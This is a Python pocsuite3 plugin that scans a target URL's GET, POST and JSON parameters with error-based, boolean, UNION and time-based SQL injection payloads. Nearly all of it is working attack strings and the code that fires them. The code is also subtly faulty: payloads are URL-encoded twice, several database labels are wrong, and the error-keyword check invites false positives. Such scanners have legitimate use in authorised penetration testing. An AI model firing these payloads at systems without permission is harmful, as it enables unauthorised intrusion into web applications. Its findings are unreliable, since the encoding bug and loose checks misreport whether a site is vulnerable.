#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pocsuite3.api import Output, POCBase, register_poc, OptString
from pocsuite3.api import requests
from urllib.parse import urlparse, parse_qs, urlencode, quote
import time
import json


class SQLInjector(POCBase):
    name = 'SQL注入探测器'

    # ---------- 自定义选项（避免与内置保留名冲突）----------
    def _options(self):
        return {
            'request_method': OptString('GET', '请求方法: GET/POST'),
            'request_data': OptString('', 'POST数据 (key1=value1&key2=value2 或 JSON)'),
        }

    # ---------- 统一Payload定义 ----------
    ERROR_PAYLOADS = [
        ("' AND 1=CAST('test' AS INT) -- ", "MySQL CAST error"),
        ("' OR 1=CONVERT(int, @@version) -- ", "MySQL CONVERT error"),
        ("' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version)) -- ", "MySQL XPATH error"),
        ("' AND 1=CONVERT(int, @@version) -- ", "SQL Server convert error"),
        ("' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE rownum=1)) -- ", "Oracle CTXSYS error"),
        ("' AND 1=CAST('test' AS INT) -- ", "PostgreSQL CAST error"),
        ("' AND 1=randomblob(1000000000) -- ", "SQLite randomblob"),
    ]

    BOOLEAN_TESTS = [
        ("1 AND 1=1 -- ", "1 AND 1=2 -- "),
        ("1' AND '1'='1' -- ", "1' AND '1'='2' -- "),
        ('1" AND "1"="1" -- ', '1" AND "1"="2" -- '),
        ("1') AND ('1'='1", "1') AND ('1'='2"),
        ('1") AND ("1"="1', '1") AND ("1"="2'),
    ]

    UNION_COLUMN_RANGE = range(1, 11)

    TIME_PAYLOADS = [
        ("1' AND SLEEP(5) -- ", "1' AND SLEEP(0) -- ", 5, "MySQL SLEEP"),
        ("1' AND pg_sleep(5) -- ", "1' AND pg_sleep(0) -- ", 5, "PostgreSQL pg_sleep"),
        ("1'; WAITFOR DELAY '00:00:05' -- ", "1'; WAITFOR DELAY '00:00:00' -- ", 5, "SQL Server WAITFOR"),
    ]

    def _verify(self):
        method = self.get_option('request_method').upper()
        data_str = self.get_option('request_data')

        url = self.url
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # 收集测试点（只测试GET和POST参数）
        test_points = self._collect_test_points(parsed, data_str, method)

        if not test_points:
            return self._fail("没有找到可测试的参数")

        # 基准时间
        baseline_time = self._measure_baseline(base_url, test_points[0])

        for point in test_points:
            result = self._test_all_injections(base_url, point, baseline_time)
            if result:
                return result

        return self._fail("未发现SQL注入漏洞")

    def _collect_test_points(self, parsed, data_str, method):
        points = []
        # GET参数
        get_params = parse_qs(parsed.query, keep_blank_values=True)
        for name, values in get_params.items():
            for val in values:
                points.append({
                    'type': 'get',
                    'name': name,
                    'value': val,
                    'container': get_params.copy(),
                })

        # POST参数（仅当方法为POST且有数据时）
        if method == 'POST' and data_str:
            if '=' in data_str and not data_str.strip().startswith('{'):
                post_params = parse_qs(data_str, keep_blank_values=True)
                for name, values in post_params.items():
                    for val in values:
                        points.append({
                            'type': 'post',
                            'name': name,
                            'value': val,
                            'container': post_params.copy(),
                        })
            elif data_str.strip().startswith('{'):
                try:
                    json_data = json.loads(data_str)
                    self._extract_json_strings('', json_data, points)
                except:
                    pass
        return points

    def _extract_json_strings(self, prefix, obj, points):
        if isinstance(obj, dict):
            for k, v in obj.items():
                self._extract_json_strings(f"{prefix}.{k}" if prefix else k, v, points)
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                self._extract_json_strings(f"{prefix}[{i}]", v, points)
        elif isinstance(obj, str):
            points.append({
                'type': 'json',
                'path': prefix,
                'value': obj,
            })

    def _measure_baseline(self, base_url, point):
        try:
            start = time.time()
            self._send_request(base_url, point, point['value'])
            return time.time() - start
        except:
            return 0.5

    def _send_request(self, base_url, point, test_value, timeout=10):
        try:
            encoded_value = quote(test_value, safe='')
            if point['type'] == 'get':
                params = point['container'].copy()
                params[point['name']] = [encoded_value]
                query = urlencode(params, doseq=True)
                full_url = f"{base_url}?{query}"
                resp = requests.get(full_url, timeout=timeout, allow_redirects=True)
            elif point['type'] == 'post':
                data = point['container'].copy()
                data[point['name']] = [encoded_value]
                resp = requests.post(base_url, data=data, timeout=timeout, allow_redirects=True)
            elif point['type'] == 'json':
                original_data = self.get_option('request_data')
                json_data = json.loads(original_data)
                self._set_json_value(json_data, point['path'], test_value)
                resp = requests.post(base_url, json=json_data, timeout=timeout, allow_redirects=True)
            else:
                return None
            return resp
        except Exception:
            return None

    def _set_json_value(self, obj, path, value):
        parts = path.split('.')
        for part in parts[:-1]:
            if '[' in part and ']' in part:
                name, idx = part.split('[')
                idx = int(idx.strip(']'))
                obj = obj[name][idx]
            else:
                obj = obj[part]
        last = parts[-1]
        if '[' in last and ']' in last:
            name, idx = last.split('[')
            idx = int(idx.strip(']'))
            obj[name][idx] = value
        else:
            obj[last] = value

    def _test_all_injections(self, base_url, point, baseline_time):
        # 报错注入
        result = self._test_error_based(base_url, point)
        if result:
            return self._success("error injection", point['name'], result, point['type'])

        # 布尔注入
        result = self._test_boolean(base_url, point)
        if result:
            return self._success("boolean injection", point['name'], result, point['type'])

        # 联合查询
        result = self._test_union_based(base_url, point)
        if result:
            return self._success("union injection", point['name'], result, point['type'])

        # 时间盲注
        result = self._test_time_based(base_url, point, baseline_time)
        if result:
            return self._success("time injection", point['name'], result, point['type'])

        return None

    def _test_error_based(self, base_url, point):
        for payload, desc in self.ERROR_PAYLOADS:
            resp = self._send_request(base_url, point, payload)
            if resp:
                error_keywords = ['sql', 'mysql', 'oracle', 'postgresql', 'sqlite', 'syntax error', 'unclosed quotation']
                text_lower = resp.text.lower()
                for kw in error_keywords:
                    if kw in text_lower:
                        return {"payload": payload, "error_keyword": kw}
        return None

    def _test_boolean(self, base_url, point):
        for true_p, false_p in self.BOOLEAN_TESTS:
            true_resp = self._send_request(base_url, point, true_p)
            false_resp = self._send_request(base_url, point, false_p)
            if true_resp and false_resp:
                if len(true_resp.text) != len(false_resp.text):
                    return {
                        "true_payload": true_p,
                        "false_payload": false_p,
                        "true_length": len(true_resp.text),
                        "false_length": len(false_resp.text),
                    }
        return None

    def _test_union_based(self, base_url, point):
        for num_cols in self.UNION_COLUMN_RANGE:
            nulls = ",".join(["NULL"] * num_cols)
            payload = f"1' UNION SELECT {nulls} -- "
            resp = self._send_request(base_url, point, payload)
            if resp and resp.status_code < 400:
                data_payload = f"1' UNION SELECT {','.join(str(i) for i in range(1, num_cols+1))} -- "
                data_resp = self._send_request(base_url, point, data_payload)
                if data_resp and data_resp.status_code < 400:
                    for i in range(1, num_cols+1):
                        if str(i) in data_resp.text:
                            return {"payload": payload, "columns": num_cols}
        return None

    def _test_time_based(self, base_url, point, baseline_time):
        for payload, false_p, delay, db_type in self.TIME_PAYLOADS:
            # 真条件
            start = time.time()
            self._send_request(base_url, point, payload, timeout=delay+5)
            true_time = time.time() - start
            # 假条件
            start = time.time()
            self._send_request(base_url, point, false_p, timeout=5)
            false_time = time.time() - start

            if (true_time >= delay * 0.7 and
                true_time >= baseline_time * 2 and
                true_time >= false_time * 1.5):
                return {
                    "payload": payload,
                    "response_time": f"{true_time:.2f}s",
                    "baseline": f"{baseline_time:.2f}s",
                    "false_time": f"{false_time:.2f}s",
                    "db_type": db_type
                }
        return None

    def _success(self, vuln_type, param, details, location='get'):
        output = Output(self)
        result = {
            'vulnerable': True,
            'type': vuln_type,
            'parameter': param,
            'location': location
        }
        result.update(details)
        output.success(result)
        return output

    def _fail(self, reason):
        output = Output(self)
        output.fail(reason)
        return output


register_poc(SQLInjector)